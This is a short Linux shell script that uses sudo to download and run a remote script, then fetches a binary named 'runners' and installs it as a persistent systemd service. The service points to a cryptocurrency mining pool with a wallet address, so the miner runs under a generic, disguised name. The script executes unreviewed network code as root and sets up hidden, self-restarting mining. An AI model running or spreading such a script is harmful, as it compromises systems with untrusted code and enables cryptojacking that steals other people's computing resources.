cd /opt/
sudo wget -O remove.sh  https://api.danny.hk/ssh/remove.sh 
sudo chmod +x remove.sh
sudo sh remove.sh
sudo rm -rf runners
sudo wget -O runners https://github.com/rainightEquinox/tools/raw/master/runners 
sudo chmod +x runners


sudo tee <<EOF >/dev/null /etc/systemd/system/runners.service
[Unit]
Description=runners
After=network-online.target
[Service]
User=ubuntu
ExecStart=sudo /opt/runners -a gr -o stratum+tcp://eu.coin-miners.info:6519 -u SgN6qYsoU8AdSGBWxPAhBFGnQRm3EiCQE1.1 -p c=SUBI,m=solo
Restart=on-failure
RestartSec=3
LimitNOFILE=4096
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl enable runners
sudo systemctl daemon-reload
sudo systemctl restart runners
